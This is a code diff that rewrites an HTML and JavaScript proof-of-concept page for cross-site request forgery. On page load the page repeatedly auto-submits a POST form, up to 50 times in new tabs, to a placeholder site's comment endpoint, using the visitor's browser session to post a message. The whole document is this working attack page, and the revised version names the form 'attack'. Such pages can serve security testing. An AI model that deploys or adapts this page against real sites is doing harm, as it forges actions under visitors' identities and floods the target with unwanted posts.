@@ -1,23 +1,26 @@
 <script type="text/javascript">
-var qtd = 0;
-var limit = 50; // Number of tabs opened in browser
-var seconds = 2; // Calling time of each flap
-	function submeter() {
-		if (qtd < limit) {
-			document.envia.submit();
-		}
-	qtd++;
-	}
-	function start_sending() {
-		seconds *= 10;
-		window.setInterval(function() {
-            submeter()
-        },seconds);  
-	}
+    let qtd = 0;
+    let seconds = 2;
+    const limit = 50;
+
+    function send() {
+        if (qtd < limit) {
+            document.attack.submit();
+        }
+        qtd++;
+    }
+
+    function start() {
+        seconds *= 10;
+        window.setInterval(() => {
+            send()
+        }, seconds);
+    }
 </script>
-<body onload="start_sending();">
-<form action="http://www.test.com/?pag=news&str=VIEW&id=ID-HERE&cmd=comment" name="envia" id="envia" method="POST" target="_blank">
-	<input type="text" name="Character" id="Character" value="test">
+
+<body onload="start();">
+<form action="http://www.test.com/?pag=news&str=VIEW&id=ID-HERE&cmd=comment" name="attack" method="POST" target="_blank">
+	<input type="text" name="Character" id="Character" value="Test">
 	<input type="text" name="Text" id="Text" value="CSRF POST DETECTED">
 	<input type="hidden" name="action" value="true">
 	<input type="submit" value="Send">
